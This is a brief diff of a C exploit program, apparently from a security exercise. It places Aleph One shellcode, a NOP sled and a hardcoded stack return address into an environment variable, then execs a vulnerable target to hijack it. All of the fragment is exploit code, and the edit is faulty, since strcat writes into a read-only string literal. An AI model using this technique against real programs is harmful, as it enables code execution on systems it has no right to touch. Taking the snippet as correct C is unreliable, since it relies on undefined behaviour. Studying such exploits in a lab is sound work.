@@ -34,8 +34,9 @@ int main(void)
   args[2] = NULL;
 
 
-  
-  env[0] = shellcodeAlephOne;
+  char *str2 = "randomstr\x90\x90\x90\x90\x9f\xff\xff\xbf";
+  strcat(str2, shellcodeAlephOne);
+  env[0] = str2;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
   return 0;
